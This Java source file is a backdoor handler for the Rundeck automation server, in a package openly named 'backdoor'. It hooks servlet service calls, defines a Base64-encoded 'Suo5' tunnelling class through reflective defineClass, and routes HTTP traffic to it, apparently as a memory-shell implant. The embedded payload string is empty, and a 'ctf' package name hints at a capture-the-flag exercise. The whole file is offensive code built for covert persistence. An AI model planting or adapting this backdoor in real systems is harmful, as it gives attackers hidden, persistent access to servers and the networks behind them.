package com.rundeck.plugins.backdoor;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;

public class Suo5Handler implements InvocationHandler {

    private static Class<?> cachedSuo5Class = null;

    private static final String SUO5_CLASS_BASE64 = "";
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        String methodName = method.getName();

        if ("service".equals(methodName)) {
            handleSuo5(args[0], args[1]);
        }

        return null;
    }

    private void handleSuo5(Object request, Object response) {
        try {
            Class<?> suo5Class = cachedSuo5Class;

            if (suo5Class == null) {
                ClassLoader rundeckCl = request.getClass().getClassLoader();

                byte[] classBytes = decodeBase64(SUO5_CLASS_BASE64);

                Method defineClassMethod = ClassLoader.class.getDeclaredMethod(
                    "defineClass", String.class, byte[].class, int.class, int.class);
                defineClassMethod.setAccessible(true);

                suo5Class = (Class<?>) defineClassMethod.invoke(
                    rundeckCl, "com.ctf.agent.tools.Suo5", classBytes, 0, classBytes.length);

                cachedSuo5Class = suo5Class;
            }

            ClassLoader rundeckCl = request.getClass().getClassLoader();
            Class<?> servletRequestClass = rundeckCl.loadClass("javax.servlet.ServletRequest");
            Class<?> servletResponseClass = rundeckCl.loadClass("javax.servlet.ServletResponse");

            Object suo = suo5Class.newInstance();
            Method processMethod = suo5Class.getMethod("process", servletRequestClass, servletResponseClass);
            processMethod.invoke(suo, request, response);

            try {
                Method getWriterMethod = response.getClass().getMethod("getWriter");
                Object out = getWriterMethod.invoke(response);
                try {
                    Method clearMethod = out.getClass().getMethod("clear");
                    clearMethod.invoke(out);
                } catch (NoSuchMethodException e) {
                }
            } catch (Exception e) {
            }

        } catch (Exception e) {
            System.err.println("[Suo5] Error: " + e.getMessage());
            e.printStackTrace();

            try {
                Method setStatusMethod = response.getClass().getMethod("setStatus", int.class);
                setStatusMethod.invoke(response, 500);
                Method getWriterMethod = response.getClass().getMethod("getWriter");
                Object writer = getWriterMethod.invoke(response);
                Method printMethod = writer.getClass().getMethod("print", String.class);
                printMethod.invoke(writer, "Suo5 Error: " + e.getMessage());
            } catch (Exception ignored) {
            }
        }
    }

    private byte[] decodeBase64(String base64Str) {
        try {
            Class<?> base64Class = Class.forName("java.util.Base64");
            Method getDecoderMethod = base64Class.getMethod("getDecoder");
            Object decoder = getDecoderMethod.invoke(null);
            Method decodeMethod = decoder.getClass().getMethod("decode", String.class);
            return (byte[]) decodeMethod.invoke(decoder, base64Str);
        } catch (Exception e1) {
            try {
                Class<?> decoderClass = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = decoderClass.newInstance();
                Method decodeMethod = decoderClass.getMethod("decodeBuffer", String.class);
                return (byte[]) decodeMethod.invoke(decoder, base64Str);
            } catch (Exception e2) {
                return new byte[0];
            }
        }
    }
}
